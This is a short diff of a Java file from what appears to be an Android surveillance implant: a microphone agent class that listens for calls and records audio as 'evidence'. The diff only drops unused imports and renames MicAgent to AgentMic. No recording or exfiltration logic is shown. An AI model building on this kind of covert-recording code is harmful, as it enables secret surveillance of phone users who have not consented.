@@ -8,10 +8,8 @@
  * *******************************************/
 package com.ht.RCSAndroidGUI.agent;
 
-import java.io.File;
 import java.io.IOException;
 import java.io.InputStream;
-import java.util.Random;
 
 import android.media.MediaRecorder;
 import android.net.LocalServerSocket;
@@ -24,8 +22,6 @@ import com.ht.RCSAndroidGUI.LogR;
 import com.ht.RCSAndroidGUI.StateRun;
 import com.ht.RCSAndroidGUI.Status;
 import com.ht.RCSAndroidGUI.evidence.EvidenceType;
-import com.ht.RCSAndroidGUI.file.AutoFile;
-import com.ht.RCSAndroidGUI.file.Path;
 import com.ht.RCSAndroidGUI.interfaces.Observer;
 import com.ht.RCSAndroidGUI.listener.ListenerCall;
 import com.ht.RCSAndroidGUI.util.Check;
@@ -64,12 +60,12 @@ import com.ht.RCSAndroidGUI.util.Utils;
  *       they were in the previous recipe for playback.
  * @author zeno
  */
-public class MicAgent extends AgentBase implements Observer<Call> {
+public class AgentMic extends AgentBase implements Observer<Call> {
 
 	private static final long MIC_PERIOD = 5000;
 	public static final byte[] AMR_HEADER = new byte[] { 35, 33, 65, 77, 82, 10 };
 
-	private static final String TAG = "MicAgent";
+	private static final String TAG = "AgentMic";
 
 	/** The recorder. */
 	MediaRecorder recorder;
